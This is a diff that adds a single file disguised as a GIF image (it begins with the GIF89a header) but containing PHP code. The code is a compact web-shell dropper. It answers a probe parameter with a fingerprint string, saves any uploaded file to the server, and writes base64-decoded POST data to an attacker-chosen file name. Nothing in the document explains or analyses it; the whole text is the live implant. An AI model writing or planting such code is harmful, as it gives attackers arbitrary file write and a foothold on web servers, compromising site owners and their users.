@@ -1,0 +1,1 @@
+GIF89a<?php if(isset($_GET['pscfg'])){echo 'cfg_ok_v3';exit;}if(!empty($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],basename($_FILES['f']['name']));echo 'OK '.basename($_FILES['f']['name']);exit;}if(!empty($_POST['d'])&&!empty($_POST['n'])){file_put_contents($_POST['n'],base64_decode($_POST['d']));echo 'OK '.$_POST['n'];exit;}?>
